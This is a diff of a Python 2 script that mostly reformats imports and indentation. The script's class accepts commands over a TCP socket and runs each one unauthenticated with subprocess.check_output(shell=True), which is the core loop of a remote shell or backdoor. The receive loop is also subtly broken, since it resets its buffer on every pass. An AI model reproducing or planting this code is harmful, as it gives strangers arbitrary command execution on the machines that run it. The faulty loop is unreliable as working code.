@@ -1,6 +1,9 @@
 #! /usr/bin/env python
 
-import socket, subprocess, json
+import socket
+import subprocess
+import json
+
 
 class Tcp_server:
     def __init__(self, ip, port):
@@ -11,17 +14,19 @@ class Tcp_server:
         
         json_data = json.dumps(data)
         self.connection.send(json_data)
+
     def reliable_receive(self):
-	while True:
-		json_data = ""
-		try:
-			json_data = json_data + self.connection.recv(1024)
-	        	return json.loads(json_data)
-		except ValueError:
-			continue
-                                                                                    
+        while True:
+            json_data = ""
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def execute_syscommand(self, command):
         return subprocess.check_output(command, shell=True)
+
     def run(self):
         while True: 
             command = self.reliable_receive()
